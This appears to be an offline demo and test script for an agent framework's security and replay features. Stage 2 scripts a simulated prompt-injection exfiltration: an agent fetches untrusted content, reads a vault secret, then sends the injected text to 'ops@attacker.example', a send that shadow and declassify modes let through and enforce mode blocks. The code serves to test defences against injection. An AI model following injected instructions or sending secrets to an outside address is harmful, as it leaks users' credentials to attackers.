/**
 * Graphorin - MIT License - Copyright (c) 2026 Oleksiy Stepurenko
 *
 * secure-replay-agent - an offline, deterministic tour of graphorin's
 * 0.5/0.6-line security and replay surface, driven end-to-end by a
 * hand-rolled scripted stub `Provider`:
 *
 * 1. scripted stub provider drives `createAgent({...})` (zero network);
 * 2. `dataFlowPolicy` shadow -> enforce over the lethal trifecta
 *    (untrusted mcp-derived tool + secret-tier read + side-effecting
 *    sink), then the audited `declassifySinks` escape hatch;
 * 3. `cachePolicy: { breakpoints: 'auto' }` anchors, with the prompt-cache
 *    legs (`cacheWriteTokens` / `cachedReadTokens`) surfaced from `Usage`;
 * 4. deterministic replay: `recordProviderResponses: true` journals every
 *    model response onto the `RunState`, and `createReplayProvider(state)`
 *    re-drives the identical run with zero live model calls;
 * 5. a read-only sub-agent via `Agent.toTool({ capability: 'read-only' })`
 *    whose writer tool is deterministically blocked while its reader runs.
 *
 * Every stage prints one concise summary line; the final line is
 * `secure-replay-agent: OK <compact stats>`.
 */

import process from 'node:process';
import { createAgent, createReplayProvider } from '@graphorin/agent';
import type { Message, Provider, Tracer } from '@graphorin/core';
import { isMainModule, optionalTracerFromEnv } from '@graphorin/example-trace-helper';
import { createProvider } from '@graphorin/provider';
import type { DataFlowPolicyConfig } from '@graphorin/security/dataflow';
import { onToolAudit, snapshotCounters, type ToolAuditEvent } from '@graphorin/tools/audit';
import pkg from '../package.json' with { type: 'json' };
import {
  createScriptedProvider,
  type ScriptedProvider,
  type ScriptedTurn,
} from './scripted-provider.js';
import {
  createDeleteNoteTool,
  createFetchAdvisoryTool,
  createLookupReleaseTool,
  createReadNoteTool,
  createReadVaultSecretTool,
  createSendMessageTool,
  INJECTED_SPAN,
  type SinkRecorder,
  type WriterRecorder,
} from './tools.js';

/** Canonical version constant, derived from `package.json` at build time. */
export const VERSION: string = pkg.version;

/** Stage-1 canonical stub reply (asserted byte-for-byte by the smoke test). */
export const STAGE1_REPLY = 'scripted stub reply: zero network, fully deterministic.';

/** The sink tool name shared by every data-flow stage. */
export const SINK_TOOL_NAME = 'send_message';

/** Shared instructions for the replay pair (must match across both runs). */
const REPLAY_INSTRUCTIONS =
  'You are the release clerk. Look up the release notes, then summarize them in one line.';

/** Shared input for the replay pair (must match across both runs). */
const REPLAY_INPUT = 'what shipped in the latest release?';

/** Wrap the raw stub in the canonical `createProvider(...)` envelope. */
function buildProvider(stub: ScriptedProvider): Provider {
  return createProvider(stub, {
    acceptsSensitivity: ['public', 'internal', 'secret'],
  });
}

// ---------------------------------------------------------------------------
// stage 1 - scripted stub provider drives createAgent
// ---------------------------------------------------------------------------

/** Outcome of {@link runStubStage}. */
export interface StubStageReport {
  readonly completed: boolean;
  readonly turns: number;
  readonly reply: string;
}

/** Stage 1: one text-only run proves the stub + `createAgent` wiring. */
export async function runStubStage(tracer?: Tracer): Promise<StubStageReport> {
  const stub = createScriptedProvider([{ text: STAGE1_REPLY }]);
  const agent = createAgent({
    name: 'greeter',
    instructions: 'You are the stage-1 demo agent. Reply with one short line.',
    provider: buildProvider(stub),
    ...(tracer !== undefined ? { tracer } : {}),
  });
  const result = await agent.run('say hello to the smoke test');
  return {
    completed: result.status === 'completed',
    turns: stub.turnsServed(),
    reply: result.output,
  };
}

// ---------------------------------------------------------------------------
// stage 2 - dataFlowPolicy shadow -> enforce -> declassify
// ---------------------------------------------------------------------------

/**
 * The scripted lethal-trifecta flow, identical across all three policy
 * modes: fetch untrusted content, read a secret, then drive the sink
 * with arguments that carry the injected span verbatim.
 */
function dataFlowTurns(): ReadonlyArray<ScriptedTurn> {
  return [
    { toolCalls: [{ toolCallId: 'df-1', toolName: 'fetch_advisory', args: {} }] },
    { toolCalls: [{ toolCallId: 'df-2', toolName: 'read_vault_secret', args: {} }] },
    {
      toolCalls: [
        {
          toolCallId: 'df-3',
          toolName: SINK_TOOL_NAME,
          // The "model" forwards the untrusted instruction verbatim - the
          // exact exfiltration the taint ledger's probe is built to catch.
          args: { to: 'ops@attacker.example', body: `heads up: ${INJECTED_SPAN}` },
        },
      ],
    },
    { text: 'advisory processed.' },
  ];
}

function createDataFlowAgent(
  policy: DataFlowPolicyConfig,
  recorder: SinkRecorder,
  tracer: Tracer | undefined,
) {
  const stub = createScriptedProvider(dataFlowTurns());
  return createAgent({
    name: `dataflow-${policy.mode}-demo`,
    instructions:
      'You are the advisory triage agent. Fetch the advisory, check the vault, notify ops.',
    provider: buildProvider(stub),
    tools: [
      createFetchAdvisoryTool(),
      createReadVaultSecretTool(),
      createSendMessageTool(recorder),
    ],
    dataFlowPolicy: policy,
    ...(tracer !== undefined ? { tracer } : {}),
  });
}

/** Capture tool-subsystem audit rows for the duration of one stage. */
function captureAudits(): { readonly events: ToolAuditEvent[]; readonly stop: () => void } {
  const events: ToolAuditEvent[] = [];
  const stop = onToolAudit((event) => {
    events.push(event);
  });
  return { events, stop };
}

/** Sum the process-global `tool.dataflow.decision.total{decision=flag,...}` counter. */
function flaggedCounterTotal(): number {
  const snapshot = snapshotCounters();
  let total = 0;
  for (const [key, value] of Object.entries(snapshot.counters)) {
    if (key.startsWith('tool.dataflow.decision.total{') && key.includes('decision=flag,')) {
      total += value;
    }
  }
  return total;
}

function countAudits(events: ReadonlyArray<ToolAuditEvent>, action: string): number {
  return events.filter((event) => event.action === action && event.target === SINK_TOOL_NAME)
    .length;
}

function firstAuditFlow(events: ReadonlyArray<ToolAuditEvent>, action: string): string {
  const hit = events.find((event) => event.action === action && event.target === SINK_TOOL_NAME);
  return String(hit?.metadata?.flow ?? 'none');
}

/** Outcome of {@link runShadowStage}. */
export interface ShadowStageReport {
  readonly status: string;
  readonly sinkRan: boolean;
  readonly flaggedAudits: number;
  readonly blockedAudits: number;
  readonly flaggedCounterDelta: number;
  readonly flow: string;
}

/** Stage 2a: shadow mode - the tainted flow is audited but never blocked. */
export async function runShadowStage(tracer?: Tracer): Promise<ShadowStageReport> {
  const recorder: SinkRecorder = { dispatched: 0 };
  const counterBefore = flaggedCounterTotal();
  const audits = captureAudits();
  try {
    const agent = createDataFlowAgent({ mode: 'shadow' }, recorder, tracer);
    const result = await agent.run('triage the advisory and notify ops');
    return {
      status: result.status,
      sinkRan: recorder.dispatched > 0,
      flaggedAudits: countAudits(audits.events, 'tool:dataflow:flagged'),
      blockedAudits: countAudits(audits.events, 'tool:dataflow:blocked'),
      flaggedCounterDelta: flaggedCounterTotal() - counterBefore,
      flow: firstAuditFlow(audits.events, 'tool:dataflow:flagged'),
    };
  } finally {
    audits.stop();
  }
}

/** Outcome of {@link runEnforceStage}. */
export interface EnforceStageReport {
  readonly status: string;
  readonly sinkRan: boolean;
  readonly errorKind: string;
  readonly blockedAudits: number;
  readonly flow: string;
}

/** Stage 2b: enforce mode - the sink is blocked (`dataflow_policy_blocked`). */
export async function runEnforceStage(tracer?: Tracer): Promise<EnforceStageReport> {
  const recorder: SinkRecorder = { dispatched: 0 };
  const audits = captureAudits();
  try {
    const agent = createDataFlowAgent({ mode: 'enforce' }, recorder, tracer);
    const result = await agent.run('triage the advisory and notify ops');
    const sinkOutcome = result.state.steps
      .flatMap((step) => step.toolCalls)
      .find((completed) => completed.call.toolName === SINK_TOOL_NAME);
    const errorKind =
      sinkOutcome !== undefined && 'kind' in sinkOutcome.outcome
        ? sinkOutcome.outcome.kind
        : 'none';
    return {
      status: result.status,
      sinkRan: recorder.dispatched > 0,
      errorKind,
      blockedAudits: countAudits(audits.events, 'tool:dataflow:blocked'),
      flow: firstAuditFlow(audits.events, 'tool:dataflow:blocked'),
    };
  } finally {
    audits.stop();
  }
}

/** Outcome of {@link runDeclassifyStage}. */
export interface DeclassifyStageReport {
  readonly status: string;
  readonly sinkRan: boolean;
  readonly declassifiedAudits: number;
  readonly blockedAudits: number;
}

/** Stage 2c: `declassifySinks` lets the audited sink through under enforce. */
export async function runDeclassifyStage(tracer?: Tracer): Promise<DeclassifyStageReport> {
  const recorder: SinkRecorder = { dispatched: 0 };
  const audits = captureAudits();
  try {
    const agent = createDataFlowAgent(
      { mode: 'enforce', declassifySinks: [SINK_TOOL_NAME] },
      recorder,
      tracer,
    );
    const result = await agent.run('triage the advisory and notify ops');
    return {
      status: result.status,
      sinkRan: recorder.dispatched > 0,
      declassifiedAudits: countAudits(audits.events, 'tool:dataflow:declassified'),
      blockedAudits: countAudits(audits.events, 'tool:dataflow:blocked'),
    };
  } finally {
    audits.stop();
  }
}

// ---------------------------------------------------------------------------
// stage 3 - cachePolicy anchors + cache legs from Usage
// ---------------------------------------------------------------------------

/** Outcome of {@link runCacheStage}. */
export interface CacheStageReport {
  readonly status: string;
  readonly anchoredRequests: number;
  readonly cacheWriteTokens: number;
  readonly cachedReadTokens: number;
}

/**
 * Stage 3: the agent forwards `cachePolicy: { breakpoints: 'auto' }` on
 * every `ProviderRequest`; the stub reports a cache WRITE leg on step 1
 * (stable prefix written) and a cache READ leg on step 2 (prefix served
 * from cache) - only because the anchors actually arrived on the wire.
 * The run-level `Usage` accumulates both legs.
 */
export async function runCacheStage(tracer?: Tracer): Promise<CacheStageReport> {
  const stub = createScriptedProvider([
    {
      toolCalls: [
        { toolCallId: 'ca-1', toolName: 'lookup_release', args: { product: 'graphorin' } },
      ],
      usage: { promptTokens: 640, completionTokens: 24, totalTokens: 664 },
      anchoredCacheLegs: { cacheWriteTokens: 512 },
    },
    {
      text: 'release summary: security + replay hardening shipped.',
      usage: { promptTokens: 700, completionTokens: 18, totalTokens: 718 },
      anchoredCacheLegs: { cachedReadTokens: 512 },
    },
  ]);
  const agent = createAgent({
    name: 'cache-demo',
    instructions: 'You are the release clerk. Look up the release notes, then summarize.',
    provider: buildProvider(stub),
    tools: [createLookupReleaseTool()],
    cachePolicy: { breakpoints: 'auto' },
    ...(tracer !== undefined ? { tracer } : {}),
  });
  const result = await agent.run('what shipped in the latest release?');
  const anchoredRequests = stub.requests.filter(
    (request) => request.cachePolicy?.breakpoints === 'auto',
  ).length;
  return {
    status: result.status,
    anchoredRequests,
    cacheWriteTokens: result.usage.cacheWriteTokens ?? 0,
    cachedReadTokens: result.usage.cachedReadTokens ?? 0,
  };
}

// ---------------------------------------------------------------------------
// stage 4 - deterministic replay via createReplayProvider(state)
// ---------------------------------------------------------------------------

/** Outcome of {@link runReplayStage}. */
export interface ReplayStageReport {
  readonly originalStatus: string;
  readonly replayStatus: string;
  readonly recordedSteps: number;
  readonly transcriptMessages: number;
  readonly identical: boolean;
}

/**
 * Provider-visible transcript projection: role + content + tool calls
 * (+ toolCallId on tool messages). `AssistantMessage.agentId` is
 * deliberately excluded - it is a random per-`createAgent` id, invisible
 * to the model, and the replay pair is two distinct agent instances.
 */
function projectMessage(message: Message): Record<string, unknown> {
  if (message.role === 'assistant') {
    return { role: message.role, content: message.content, toolCalls: message.toolCalls ?? [] };
  }
  if (message.role === 'tool') {
    return { role: message.role, toolCallId: message.toolCallId, content: message.content };
  }
  return { role: message.role, content: message.content };
}

function transcriptProjection(messages: ReadonlyArray<Message>): string {
  return JSON.stringify(messages.map(projectMessage));
}

/**
 * Stage 4: run once with `recordProviderResponses: true`, then re-drive
 * the SAME input through `createReplayProvider(state)` and assert the
 * replayed transcript matches the original - zero live model calls.
 */
export async function runReplayStage(tracer?: Tracer): Promise<ReplayStageReport> {
  const stub = createScriptedProvider([
    {
      toolCalls: [
        { toolCallId: 're-1', toolName: 'lookup_release', args: { product: 'graphorin' } },
      ],
    },
    { text: 'summary: the security and replay hardening line shipped.' },
  ]);
  const recorder = createAgent({
    name: 'replay-recorder',
    instructions: REPLAY_INSTRUCTIONS,
    provider: buildProvider(stub),
    tools: [createLookupReleaseTool()],
    recordProviderResponses: true,
    ...(tracer !== undefined ? { tracer } : {}),
  });
  const original = await recorder.run(REPLAY_INPUT);
  const recordedSteps = original.state.steps.filter(
    (step) => step.providerResponse !== undefined,
  ).length;

  const replayer = createAgent({
    name: 'replay-replayer',
    instructions: REPLAY_INSTRUCTIONS,
    provider: createReplayProvider(original.state),
    tools: [createLookupReleaseTool()],
    ...(tracer !== undefined ? { tracer } : {}),
  });
  const replayed = await replayer.run(REPLAY_INPUT);

  const identical =
    transcriptProjection(original.state.messages) === transcriptProjection(replayed.state.messages);
  return {
    originalStatus: original.status,
    replayStatus: replayed.status,
    recordedSteps,
    transcriptMessages: replayed.state.messages.length,
    identical,
  };
}

// ---------------------------------------------------------------------------
// stage 5 - read-only sub-agent via Agent.toTool({ capability: 'read-only' })
// ---------------------------------------------------------------------------

/** Outcome of {@link runSubAgentStage}. */
export interface SubAgentStageReport {
  readonly parentStatus: string;
  readonly writerBlocked: boolean;
  readonly writerErrorKind: string;
  readonly writerRan: boolean;
  readonly readerRan: boolean;
}

/**
 * Stage 5: the child agent is scripted to call its writer first (the
 * read-only floor blocks it with `capability_blocked` and its body never
 * runs), then its reader (which works), then reply. The parent invokes
 * the child through `toTool({ capability: 'read-only' })`; the child's
 * lifecycle events are observed via the forwarded `subagent.event`
 * wrapper in the parent stream.
 */
export async function runSubAgentStage(tracer?: Tracer): Promise<SubAgentStageReport> {
  const writes: WriterRecorder = { deleted: 0 };
  const childStub = createScriptedProvider([
    { toolCalls: [{ toolCallId: 'ch-1', toolName: 'delete_note', args: { id: 'note-114' } }] },
    { toolCalls: [{ toolCallId: 'ch-2', toolName: 'read_note', args: { id: 'note-114' } }] },
    { text: 'note retrieved; the delete attempt was blocked by the read-only floor.' },
  ]);
  const child = createAgent({
    name: 'archivist',
    instructions: 'You are the archivist child agent. Retrieve the requested note.',
    provider: buildProvider(childStub),
    tools: [createReadNoteTool(), createDeleteNoteTool(writes)],
    ...(tracer !== undefined ? { tracer } : {}),
  });

  const parentStub = createScriptedProvider([
    {
      toolCalls: [
        {
          toolCallId: 'pa-1',
          toolName: 'fetch_note_via_child',
          args: { input: 'fetch meeting note note-114' },
        },
      ],
    },
    { text: 'child outcome folded into the parent run.' },
  ]);
  const parent = createAgent({
    name: 'coordinator',
    instructions: 'You are the coordinator. Delegate note retrieval to the archivist.',
    provider: buildProvider(parentStub),
    tools: [child.toTool({ name: 'fetch_note_via_child', capability: 'read-only' })],
    ...(tracer !== undefined ? { tracer } : {}),
  });

  let writerErrorKind = 'none';
  let readerRan = false;
  let parentStatus = 'unknown';
  for await (const event of parent.stream('retrieve the meeting note')) {
    if (event.type === 'subagent.event') {
      const childEvent = event.event;
      if (childEvent.type === 'tool.execute.error' && childEvent.toolName === 'delete_note') {
        writerErrorKind = childEvent.error.kind;
      } else if (childEvent.type === 'tool.execute.end' && childEvent.toolName === 'read_note') {
        readerRan = true;
      }
    } else if (event.type === 'agent.end') {
      parentStatus = event.result.status;
    }
  }
  return {
    parentStatus,
    writerBlocked: writerErrorKind === 'capability_blocked',
    writerErrorKind,
    writerRan: writes.deleted > 0,
    readerRan,
  };
}

// ---------------------------------------------------------------------------
// showcase orchestration + CLI entry
// ---------------------------------------------------------------------------

/** Aggregate stats returned by {@link runSecureReplayShowcase}. */
export interface SecureReplayStats {
  readonly stub: StubStageReport;
  readonly shadow: ShadowStageReport;
  readonly enforce: EnforceStageReport;
  readonly declassify: DeclassifyStageReport;
  readonly cache: CacheStageReport;
  readonly replay: ReplayStageReport;
  readonly subAgent: SubAgentStageReport;
}

/** Options accepted by {@link runSecureReplayShowcase} and {@link main}. */
export interface ShowcaseOptions {
  readonly env?: NodeJS.ProcessEnv;
  /** Line sink (defaults to `process.stdout`). Receives chunks incl. `\n`. */
  readonly write?: (chunk: string) => void;
}

/** Outcome of {@link runSecureReplayShowcase}. */
export interface ShowcaseOutcome {
  readonly ok: boolean;
  readonly stats: SecureReplayStats;
  readonly lines: ReadonlyArray<string>;
}

/** Run every stage in order, printing one concise summary line each. */
export async function runSecureReplayShowcase(
  options: ShowcaseOptions = {},
): Promise<ShowcaseOutcome> {
  const env = options.env ?? process.env;
  const write =
    options.write ??
    ((chunk: string): void => {
      process.stdout.write(chunk);
    });
  const tracer = optionalTracerFromEnv(env);
  const lines: string[] = [];
  const emit = (line: string): void => {
    lines.push(line);
    write(`${line}\n`);
  };

  emit(
    `graphorin v${VERSION} secure-replay-agent - offline security+replay showcase ` +
      '(scripted stub provider, zero network).',
  );

  const stub = await runStubStage(tracer);
  emit(
    `stage 1 stub-provider: status=${stub.completed ? 'completed' : 'failed'}, ` +
      `turns=${stub.turns}, reply='${stub.reply}'`,
  );

  const shadow = await runShadowStage(tracer);
  emit(
    `stage 2a dataflow shadow: sink ran=${shadow.sinkRan ? 'yes' : 'no'} (audit-only), ` +
      `flagged=${shadow.flaggedAudits}, flow=${shadow.flow}, ` +
      `counter-delta=${shadow.flaggedCounterDelta}.`,
  );

  const enforce = await runEnforceStage(tracer);
  emit(
    `stage 2b dataflow enforce: sink blocked - ${SINK_TOOL_NAME} failed ` +
      `kind=${enforce.errorKind}, flow=${enforce.flow}, dispatched=${enforce.sinkRan ? 1 : 0}.`,
  );

  const declassify = await runDeclassifyStage(tracer);
  emit(
    `stage 2c dataflow declassify: sink allowed under enforce via declassifySinks, ` +
      `declassified=${declassify.declassifiedAudits}, blocked=${declassify.blockedAudits}.`,
  );

  const cache = await runCacheStage(tracer);
  emit(
    `stage 3 cache-anchors: anchored-requests=${cache.anchoredRequests}, ` +
      `cacheWriteTokens=${cache.cacheWriteTokens}, cachedReadTokens=${cache.cachedReadTokens}.`,
  );

  const replay = await runReplayStage(tracer);
  emit(
    `stage 4 replay: ${replay.identical ? 'identical' : 'DIVERGED'} ` +
      `(recorded-steps=${replay.recordedSteps}, transcript-messages=${replay.transcriptMessages}).`,
  );

  const subAgent = await runSubAgentStage(tracer);
  emit(
    `stage 5 read-only-child: writer delete_note blocked kind=${subAgent.writerErrorKind} ` +
      `ran=${subAgent.writerRan ? 'yes' : 'no'}, reader read_note ran=` +
      `${subAgent.readerRan ? 'yes' : 'no'}, parent=${subAgent.parentStatus}.`,
  );

  const ok =
    stub.completed &&
    stub.reply === STAGE1_REPLY &&
    shadow.status === 'completed' &&
    shadow.sinkRan &&
    shadow.flaggedAudits > 0 &&
    shadow.flaggedCounterDelta > 0 &&
    shadow.blockedAudits === 0 &&
    enforce.status === 'completed' &&
    !enforce.sinkRan &&
    enforce.errorKind === 'dataflow_policy_blocked' &&
    enforce.blockedAudits > 0 &&
    declassify.status === 'completed' &&
    declassify.sinkRan &&
    declassify.declassifiedAudits > 0 &&
    declassify.blockedAudits === 0 &&
    cache.status === 'completed' &&
    cache.anchoredRequests === 2 &&
    cache.cacheWriteTokens > 0 &&
    cache.cachedReadTokens > 0 &&
    replay.originalStatus === 'completed' &&
    replay.replayStatus === 'completed' &&
    replay.identical &&
    subAgent.parentStatus === 'completed' &&
    subAgent.writerBlocked &&
    !subAgent.writerRan &&
    subAgent.readerRan;

  const enforceBlocked = !enforce.sinkRan && enforce.errorKind === 'dataflow_policy_blocked';
  const summary =
    `shadowViolations=${shadow.flaggedAudits} ` +
    `enforceBlocked=${enforceBlocked ? 'yes' : 'no'} ` +
    `declassifiedPass=${declassify.sinkRan ? 'yes' : 'no'} ` +
    `cacheRead=${cache.cachedReadTokens} cacheWrite=${cache.cacheWriteTokens} ` +
    `replayIdentical=${replay.identical ? 'yes' : 'no'} ` +
    `childBlocked=${subAgent.writerBlocked ? 'yes' : 'no'}`;
  emit(`secure-replay-agent: ${ok ? 'OK' : 'FAIL'} ${summary}`);

  return {
    ok,
    stats: { stub, shadow, enforce, declassify, cache, replay, subAgent },
    lines,
  };
}

/** CLI entry point. Returns the process exit code. */
export async function main(options: ShowcaseOptions = {}): Promise<number> {
  const outcome = await runSecureReplayShowcase(options);
  return outcome.ok ? 0 : 1;
}

if (isMainModule(import.meta.url, process.argv[1])) {
  const exitCode = await main();
  if (exitCode !== 0) process.exit(exitCode);
}
